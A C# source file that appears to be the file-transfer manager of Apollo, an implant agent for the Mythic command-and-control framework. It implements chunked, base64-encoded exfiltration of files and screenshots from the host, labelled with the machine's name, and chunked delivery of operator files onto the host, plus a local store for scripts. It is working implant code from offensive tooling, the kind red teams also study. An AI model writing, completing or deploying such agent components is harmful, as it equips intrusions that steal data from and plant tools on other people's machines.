using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using EncryptedFileStore.Plaintext;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;

namespace Apollo.Management.Files
{
    public sealed class FileManager : IFileManager
    {
        private int _chunkSize = 512000;
        private IAgent _agent;
        private IEncryptedFileStore _fileStore;
        public FileManager(IAgent agent)
        {
            _agent = agent;
            _fileStore = new PlaintextFileStore(_agent);
        }
        internal struct UploadMessageTracker
        {
            internal AutoResetEvent Complete;
            internal ChunkedMessageStore<TaskStatus> MessageStore;
            internal byte[] Data;

            internal UploadMessageTracker(bool initialState = false, ChunkedMessageStore<TaskStatus> store = null, byte[] data = null)
            {
                Complete = new AutoResetEvent(initialState);
                MessageStore = store == null ? new ChunkedMessageStore<TaskStatus>() : store;
                Data = data;
            }
        }

        // Annoyingly, we need a separate struct as Download task responses don't have 
        public class DownloadMessageTracker
        {
            public AutoResetEvent Complete = new AutoResetEvent(false);
            public List<TaskStatus> Statuses = new List<TaskStatus>();
            public event EventHandler<ChunkMessageEventArgs<TaskStatus>> ChunkAdd;
            public event EventHandler<ChunkMessageEventArgs<TaskStatus>> AllChunksSent;
            public int TotalChunks { get; private set; }
            public string FilePath { get; private set; }
            public string Hostname { get; private set; }
            public int ChunkSize { get; private set; }
            public byte[][] Chunks { get; private set; }
            public int ChunksSent { get; private set; } = 0;
            public string FileID = "";
            private object _lock = new object();
            public bool IsScreenshot { get; private set; }
            internal DownloadMessageTracker(byte[] data, int chunkSize, string filePath, string hostName = "", bool screenshot = false)
            {
                TotalChunks = (int)Math.Ceiling((double)data.Length / (double)chunkSize);
                Chunks = new byte[TotalChunks][];
                for(int i = 0; i < TotalChunks; i++)
                {
                    Chunks[i] = data.Skip(i * chunkSize).Take(chunkSize).ToArray();
                }
                FilePath = filePath;
                Hostname = hostName;
                IsScreenshot = screenshot;
            }

            public void AddMessage(TaskStatus t)
            {
                if (!string.IsNullOrEmpty(t.FileID) && string.IsNullOrEmpty(FileID))
                {
                    FileID = t.FileID;
                } else if (t.StatusMessage == "success")
                {
                    ChunksSent += 1;
                }
                Statuses.Add(t);
                if (ChunksSent == TotalChunks)
                {
                    Complete.Set();
                    AllChunksSent?.Invoke(this, new ChunkMessageEventArgs<TaskStatus>(new TaskStatus[] { t }));
                } else
                {
                    ChunkAdd?.Invoke(this, new ChunkMessageEventArgs<TaskStatus>(new TaskStatus[]{ t }));
                }
            }
        }

        private ConcurrentDictionary<string, UploadMessageTracker> _uploadMessageStore = new ConcurrentDictionary<string, UploadMessageTracker>();
        private ConcurrentDictionary<string, DownloadMessageTracker> _downloadMessageStore = new ConcurrentDictionary<string, DownloadMessageTracker>();
        
        public string[] GetPendingTransfers()
        {
            return _uploadMessageStore.Keys.Concat(_downloadMessageStore.Keys).ToArray();
        }

        public void ProcessResponse(TaskStatus resp)
        {
            if (_uploadMessageStore.ContainsKey(resp.TaskID))
            {
                // This is an upload message response, send it along.
                if (resp.ChunkNumber > 0)
                {
                    _uploadMessageStore[resp.TaskID].MessageStore.AddMessage(resp);
                }
            } else
            {
                _downloadMessageStore[resp.TaskID].AddMessage(resp);
            }
        }

        private void FileManager_MessageComplete(object sender, ChunkMessageEventArgs<TaskStatus> e)
        {
            List<byte> data = new List<byte>();
            for(int i = 0; i < e.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(e.Chunks[i].ChunkData));
            }
            if (_uploadMessageStore.TryGetValue(e.Chunks[0].TaskID, out UploadMessageTracker tracker))
            {
                tracker.Data = data.ToArray();
                _uploadMessageStore[e.Chunks[0].TaskID] = tracker;
                tracker.Complete.Set();
            }
        }

        public bool PutFile(CancellationToken ct, string taskID, byte[] content, string originatingPath, bool isScreenshot = false, string originatingHost = null)
        {
            lock(_downloadMessageStore)
            {
                if (!_downloadMessageStore.ContainsKey(taskID))
                {
                    if (string.IsNullOrEmpty(originatingHost))
                    {
                        originatingHost = Environment.GetEnvironmentVariable("COMPUTERNAME");
                    }
                    _downloadMessageStore[taskID] = new DownloadMessageTracker(content, _chunkSize, originatingPath, originatingHost, isScreenshot);
                    _downloadMessageStore[taskID].ChunkAdd += DownloadChunkSent;
                }
            }
            _agent.GetTaskManager().AddTaskResponseToQueue(new TaskResponse()
            {
                TaskID = taskID,
                Download = new DownloadMessage
                {
                    TotalChunks = _downloadMessageStore[taskID].TotalChunks,
                    FullPath = originatingPath,
                    Hostname = originatingHost,
                    IsScreenshot = isScreenshot,
                    TaskID = taskID
                }
            });
            WaitHandle.WaitAny(new WaitHandle[]
            {
                _downloadMessageStore[taskID].Complete,
                ct.WaitHandle
            });
            _downloadMessageStore.TryRemove(taskID, out DownloadMessageTracker _);
            return !ct.IsCancellationRequested;
        }

        public bool GetFile(CancellationToken ct, string taskID, string fileID, out byte[] fileBytes)
        {
            lock(_uploadMessageStore)
            {
                if (!_uploadMessageStore.ContainsKey(taskID))
                {
                    _uploadMessageStore[taskID] = new UploadMessageTracker(false);
                    _uploadMessageStore[taskID].MessageStore.ChunkAdd += MessageStore_ChunkAdd;
                    _uploadMessageStore[taskID].MessageStore.MessageComplete += FileManager_MessageComplete;
                }
            }
            _agent.GetTaskManager().AddTaskResponseToQueue(new TaskResponse()
            {
                TaskID = taskID,
                Upload = new UploadMessage()
                {
                    TaskID = taskID,
                    FileID = fileID,
                    ChunkNumber = 1,
                    ChunkSize = _chunkSize
                }
            });
            WaitHandle.WaitAny(new WaitHandle[]
            {
                _uploadMessageStore[taskID].Complete,
                ct.WaitHandle
            });
            bool bRet = false;
            if (_uploadMessageStore[taskID].Data != null)
            {
                fileBytes = _uploadMessageStore[taskID].Data;
                bRet = true;
            } else
            {
                fileBytes = null;
                bRet = false;
            }
            _uploadMessageStore.TryRemove(taskID, out UploadMessageTracker _);
            return bRet;
        }

        private void MessageStore_ChunkAdd(object sender, ChunkMessageEventArgs<TaskStatus> e)
        {
            TaskStatus msg = e.Chunks[0];
            _agent.GetTaskManager().AddTaskResponseToQueue(new TaskResponse()
            {
                TaskID = msg.TaskID,
                Upload = new UploadMessage()
                {
                    TaskID = msg.TaskID,
                    FileID = msg.FileID,
                    ChunkNumber = msg.ChunkNumber + 1,
                    ChunkSize = _chunkSize
                }
            });
        }

        private void DownloadChunkSent(object sender, ChunkMessageEventArgs<TaskStatus> e)
        {
            DownloadMessageTracker tracker = (DownloadMessageTracker)sender;
            _agent.GetTaskManager().AddTaskResponseToQueue(new TaskResponse()
            {
                TaskID = e.Chunks[0].TaskID,
                Download = new DownloadMessage
                {
                    ChunkNumber = tracker.ChunksSent + 1,
                    FileID = tracker.FileID,
                    ChunkData = Convert.ToBase64String(tracker.Chunks[tracker.ChunksSent]),
                    TaskID = e.Chunks[0].TaskID
                }
            });
        }

        public string GetScript()
        {
            return _fileStore.GetScript();
        }

        public void SetScript(string script)
        {
            _fileStore.SetScript(script);
        }

        public bool AddFileToStore(string keyName, byte[] data)
        {
            return _fileStore.TryAddOrUpdate(keyName, data);
        }

        public bool GetFileFromStore(string keyName, out byte[] data)
        {
            return _fileStore.TryGetValue(keyName, out data);
        }

        public void SetScript(byte[] script)
        {
            _fileStore.SetScript(script);
        }
    }
}
